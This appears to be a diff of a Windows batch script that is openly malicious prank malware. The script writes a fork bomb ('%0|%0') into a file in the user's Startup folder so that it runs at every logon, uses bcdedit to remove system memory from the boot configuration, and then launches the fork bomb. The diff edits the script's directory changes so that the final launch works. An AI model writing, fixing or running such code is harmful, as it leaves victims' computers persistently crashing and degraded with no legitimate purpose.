@@ -1,4 +1,5 @@
 @echo off 
+cd
 cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
 echo -e "%0|%0" > funny.bat
 
@@ -19,6 +20,7 @@ echo Will be getting rid of %c% bytes of memory
 
 bcdedit.exe /set removememory %c% 
 
-
+cd
+cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
 funny.bat
  
